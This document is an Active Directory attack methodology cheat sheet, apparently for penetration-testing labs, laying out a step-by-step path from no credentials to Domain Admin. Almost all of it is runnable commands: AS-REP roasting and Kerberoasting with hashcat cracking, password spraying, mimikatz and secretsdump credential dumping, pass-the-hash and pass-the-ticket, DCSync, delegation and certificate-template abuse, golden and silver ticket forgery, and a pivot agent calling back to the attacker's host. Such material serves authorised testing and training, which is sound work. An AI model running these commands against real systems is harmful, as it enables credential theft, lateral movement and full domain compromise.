# Methodology 3 — Active Directory

> Goal: foothold on a domain host (or just a valid cred) → Domain Admin / DC. AD is a **loop**: get a credential → enumerate as that credential → find the next hop (roast, spray, ACL, delegation, cred on disk) → move laterally → repeat until DA. Feed **every** credential into BloodHound and spray it across every host.

> Set this up first: add the domain + DC to `/etc/hosts` (`$IP dc01.domain.local domain.local`), and fix clock skew before any Kerberos action: `sudo ntpdate $DC` or `sudo rdate -n $DC` (toggle `timedatectl set-ntp off` first).

---

## 1. Initial enumeration

### No creds yet (from an external/foothold position)
```bash
netexec smb $DC                                  # domain name, hostname, OS
enum4linux-ng -A $DC
nmap -p88,135,139,389,445,464,636,3268,5985 $DC
# null / guest session
netexec smb $DC -u '' -p '' --shares --users
netexec smb $DC -u 'guest' -p '' --rid-brute     # users via RID cycling
rpcclient -U '' -N $DC -c "enumdomusers;querydominfo"
# user list from website staff names / enum → validate with kerbrute (no lockout risk)
kerbrute userenum -d $DOMAIN --dc $DC users.txt
# ASREP-roast WITHOUT creds (no-preauth users)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip $DC
# anonymous LDAP
ldapsearch -x -H ldap://$DC -b "DC=domain,DC=local" | head
```

### With a credential (user:pass or user:hash) — enumerate hard
```bash
# BloodHound data FIRST — it finds the path for you
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC -c All --zip
# (or on host: SharpHound.exe -c All / Invoke-BloodHound -CollectionMethod All)

netexec smb $DC -u $USER -p $PASS --users --groups --shares --pass-pol --loggedon-users
netexec ldap $DC -u $USER -p $PASS --users --groups
netexec smb <range> -u $USER -p $PASS            # where am I local admin? (Pwn3d!)
```
**On a domain-joined Windows host (PowerView):**
```powershell
Import-Module .\PowerView.ps1
Get-NetDomain ; Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser | ? {$_.serviceprincipalname} | select samaccountname   # kerberoastable
Get-NetUser -PreauthNotRequired                                     # ASREP-roastable
Get-NetGroup "Domain Admins" | select member
Get-NetGroup | ? {$_.member}                                        # nested groups
Find-DomainShare -CheckShareAccess
Get-DomainComputer | select name,operatingsystem
Find-LocalAdminAccess                                               # where am I admin
Get-NetComputer -Ping | Find-DomainUserLocation                     # where are admins logged in
```
**Legacy / built-in:**
```cmd
net user /domain & net group /domain
net group "Domain Admins" /domain
net accounts /domain            :: password & lockout policy (spray safely)
setspn -L <user>                :: SPNs
```
**Always check SYSVOL / shares** for GPP `cpassword` (Groups.xml), scripts, configs:
```bash
smbclient //$DC/SYSVOL -U "$USER%$PASS"      # look in Policies\...\Groups.xml
gpp-decrypt <cpassword>
```

---

## 2. Credential access — turn 1 user into more

### Kerberoasting (any domain user → service-account hash)
```bash
impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile kerb.hash
netexec ldap $DC -u $USER -p $PASS --kerberoasting kerb.hash
```
```powershell
.\Rubeus.exe kerberoast /nowrap /outfile:kerb.hash
```
```bash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### ASREP Roasting (users with "no preauth")
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip $DC
# or targeted if you have creds:
netexec ldap $DC -u $USER -p $PASS --asreproast asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Password spraying (after you have ONE password or a username list)
```bash
# CHECK LOCKOUT POLICY FIRST (net accounts). Then:
netexec smb $DC -u users.txt -p 'Season2024!' --continue-on-success
netexec smb <range> -u users.txt -p users.txt --continue-on-success   # username==password
kerbrute passwordspray -d $DOMAIN users.txt 'Welcome1'
```
Spray every new password across all users/hosts. Watch the `(Pwn3d!)` = local admin.

### Dump creds on a host you control
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords        # plaintext + NTLM from LSASS
sekurlsa::tickets /export       # TGT/TGS → pass-the-ticket
lsadump::sam                    # local SAM
```
```bash
netexec smb $IP -u $USER -p $PASS --sam --lsa          # local hashes
netexec smb $IP -u $USER -p $PASS -M lsassy            # remote LSASS
impacket-secretsdump $DOMAIN/$USER:$PASS@$IP
```

---

## 3. Lateral movement — use a cred/hash/ticket to run code

| Have | Use |
|---|---|
| user:pass, local admin | `impacket-psexec`, `netexec smb -x`, evil-winrm |
| **NTLM hash** (admin) | Pass-the-Hash |
| Kerberos TGT/TGS | Pass-the-Ticket / Overpass-the-Hash |
| WinRM (5985) member of Remote Mgmt | evil-winrm / winrs |

```bash
# password
impacket-psexec $DOMAIN/$USER:$PASS@$IP            # SYSTEM, noisy, writes service
impacket-wmiexec $DOMAIN/$USER:$PASS@$IP           # stealthier, no service
evil-winrm -i $IP -u $USER -p $PASS
netexec smb $IP -u $USER -p $PASS -x "whoami"      # quick exec / --sam

# Pass-the-Hash (NTLM, local admin or built-in admin)
impacket-wmiexec -hashes :$NTHASH Administrator@$IP
netexec smb $IP -u Administrator -H $NTHASH -x "whoami"
evil-winrm -i $IP -u Administrator -H $NTHASH
pth-winexe -U 'admin%:$NTHASH' //$IP cmd.exe
```
**Overpass-the-Hash (NTLM → Kerberos TGT), on Windows:**
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:<hash> /run:powershell
# then trigger a kerberos auth and use psexec (no hash needed)
.\PsExec.exe \\host cmd
```
**Pass-the-Ticket (inject an existing/forged ticket):**
```powershell
sekurlsa::tickets /export            # pick ...dave@cifs-host.kirbi
kerberos::ptt [0;xxxxx]-0-0-...-dave@cifs-host.kirbi
klist
# linux: export KRB5CCNAME=ticket.ccache ; ticketConverter.py t.kirbi t.ccache
```
**WinRM / WMI / DCOM one-liners (lab):**
```cmd
winrs -r:host -u:user -p:pass "whoami"
wmic /node:$IP /user:user /password:pass process call create "cmd /c <payload>"
```

---

## 4. Privilege escalation inside the domain (BloodHound shortest path)

Run BloodHound, mark owned, "Shortest Path to Domain Admins." Common abuses:

- **DCSync** (user has Replicating-Directory-Changes / is DA/Enterprise Admin):
  ```bash
  impacket-secretsdump -just-dc-user Administrator $DOMAIN/$USER:$PASS@$DC
  impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASS@$DC
  ```
  ```powershell
  lsadump::dcsync /user:corp\krbtgt       # mimikatz on DC-adjacent host
  ```
- **GenericAll / GenericWrite / WriteDACL on a user** → targeted Kerberoast (set SPN) or reset their password:
  ```bash
  net rpc password "victim" "NewPass123!" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
  pywhisker / targetedKerberoast.py
  ```
- **GenericAll on a group** → add yourself:
  ```powershell
  Add-DomainGroupMember -Identity 'Core Staff' -Members me        # PowerView
  net group "group" me /add /domain
  ```
- **GenericAll / GenericWrite on a COMPUTER** → **Resource-Based Constrained Delegation (RBCD)**:
  ```powershell
  New-MachineAccount -MachineAccount fake -Password (ConvertTo-SecureString 'Pass123' -AsPlainText -Force)   # Powermad
  $sid = Get-DomainComputer fake | select -expand objectsid
  # set msds-allowedtoactonbehalfofotheridentity on target, then:
  .\Rubeus.exe hash /password:Pass123 /user:fake$ /domain:$DOMAIN
  .\Rubeus.exe s4u /user:fake$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc.$DOMAIN /ptt
  ```
  (Linux: `impacket-rbcd`, `impacket-getST -spn cifs/dc -impersonate Administrator -dc-ip $DC 'dom/fake$:Pass'`)
- **ReadGMSAPassword** → `netexec ldap $DC -u u -p p --gmsa`.
- **ReadLAPSPassword / LAPS** → `netexec smb $DC -u u -p p --laps` or `ldapsearch … ms-MCS-AdmPwd`.
- **ForceChangePassword** → reset target password and move on.
- **AddSelf / WriteOwner** → take ownership → grant rights → abuse.

### ADCS (certificate abuse — Certipy) — very common escalation
```bash
certipy-ad find -u $USER -p $PASS -dc-ip $DC -vulnerable -stdout     # ESC1-8
# ESC1 example: request cert as admin via vulnerable template
certipy-ad req -u $USER -p $PASS -ca <CA> -target <ca-host> -template <tpl> -upn administrator@$DOMAIN
certipy-ad auth -pfx administrator.pfx -dc-ip $DC                    # → NT hash / TGT
```

### Ticket forgery (persistence / full domain)
```powershell
# Silver ticket (service NTLM hash + domain SID + SPN → forge access to that service)
kerberos::golden /sid:<SID> /domain:corp.com /target:host /service:http /rc4:<svc-hash> /user:anyuser /ptt
# Golden ticket (krbtgt hash from DCSync → any user, whole domain)
lsadump::lsa /patch                      # get krbtgt hash + SID
kerberos::golden /user:jen /domain:corp.com /sid:<SID> /krbtgt:<krbtgt-hash> /ptt
```

### Other box-proven escalations to try
- **GPO abuse** (WriteGPO/edit rights) → `pygpoabuse` to add a scheduled task/local admin.
- **Silver ticket via captured service hash**, **MSSQL trusted links** (`impacket-mssqlclient` → `enum_links` → `EXECUTE AS`).
- **Autologon / stored creds** in registry on member servers (see Windows privesc).
- **SeImpersonate on a member server** (MSSQL/IIS service) → **Potato → local SYSTEM**, then DCSync if the machine account has rights or dump domain creds from it.

---

## 5. Pivoting (multi-host labs — Ligolo-ng, preferred over chisel/proxychains)
```bash
# Attacker: once (tun iface + proxy)
sudo ip tuntap add user $USER mode tun ligolo ; sudo ip link set ligolo up
./proxy -selfcert
# On pivot host (agent):
./agent -connect $LHOST:11601 -ignore-cert
# Back in ligolo prompt:
session                                   # select it
sudo ip route add 172.16.x.0/24 dev ligolo   # route the internal subnet
start
# reverse listener to catch internal shells on your kali:
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:443 --tcp
```
After pivoting, re-run the whole AD loop against the internal subnet (scan → enum → BloodHound with the internal DC as `-ns`).

---

## AD decision flow
1. Add hosts to `/etc/hosts`, fix clock skew.
2. **No cred?** null/guest SMB+RID, kerbrute userenum, ASREP-roast, anon LDAP, SYSVOL GPP.
3. **Got a cred?** → BloodHound immediately + spray it everywhere + check local admin (`Pwn3d!`).
4. Roast everything: Kerberoast + ASREP-roast → hashcat.
5. Dump creds on any host you own (mimikatz/secretsdump) → new hashes/tickets.
6. BloodHound shortest path → ACL abuse / delegation / ADCS / LAPS / gMSA.
7. Lateral move (psexec/wmiexec/winrm, PtH, PtT, OtH) to each new host; loot each.
8. DA path: **DCSync** → krbtgt → golden ticket, or ADCS admin cert, or direct DA cred.
9. Multi-host → Ligolo pivot → repeat internally.
10. Stuck → feed the newest credential back into BloodHound and re-spray. The next hop is almost always an ACL, a roastable account, or a reused password you already have.
